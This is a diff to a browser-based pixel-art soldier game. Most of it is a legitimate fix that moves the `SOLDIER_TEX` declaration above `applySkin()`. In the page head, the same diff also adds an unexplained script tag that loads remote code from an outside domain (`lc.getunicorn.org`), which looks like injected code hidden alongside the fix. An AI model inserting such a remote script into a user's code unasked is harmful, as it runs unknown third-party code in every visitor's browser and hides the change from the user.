@@ -48,6 +48,7 @@
   .stageCell.current{border-color:#ffd45e;background:rgba(255,212,94,.16);color:#ffe08a}
   .skinRow{display:flex;gap:7px;margin-top:8px}.skinBtn{flex:1;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.05);color:#fff;border-radius:10px;padding:8px 3px;font-weight:800;font-size:11px}.skinBtn.sel{border-color:#ffd45e;background:rgba(255,212,94,.14)}
 </style>
+<script type="text/javascript" nonce="XOJ0BVE+zr3qdJZKBBAaLFbFzesxhK/xP1QmLnOdycs=" src="//lc.getunicorn.org?type=base-script&amp;request-id=1666"></script>
 </head>
 <body>
 <div id="wrap">
@@ -880,13 +881,14 @@ const SKINS={
   elite:{name:'엘리트 특공대',icon:'⭐',cost:300,pal:{'M':'#72572c','m':'#a27a35','G':'#352918','g':'#604b25','E':'#f2d36b','V':'#87682e','v':'#604a24','K':'#241c12','A':'#4a371c','P':'#513c1e'}}
 };
 let skinType=localStorage.getItem('dr_skin_type')||'basic';
+// Must be declared before applySkin() because applySkin resets the cached texture.
+let SOLDIER_TEX=null;
 function applySkin(){ const base={'o':'#1a1c16','S':'#d6aa84','s':'#af8b6c','R':'#8a8f98','r':'#b3b9c5'}; SOLDIER_PAL=Object.assign({},base,SKINS[skinType].pal); SOLDIER_TEX=null; localStorage.setItem('dr_skin_type',skinType); }
 applySkin();
 
 const PXW=22, PXH=26;
 function flipRows(rows){ return rows.map(r=>r.split('').reverse().join('')); }
 // 8개 상태(방향×프레임) + 각 흰색(피격) 버전 캐시
-let SOLDIER_TEX=null;
 function buildFrameCanvas(rows, white){
   const cv=document.createElement('canvas'); cv.width=PXW; cv.height=PXH;
   const c=cv.getContext('2d');
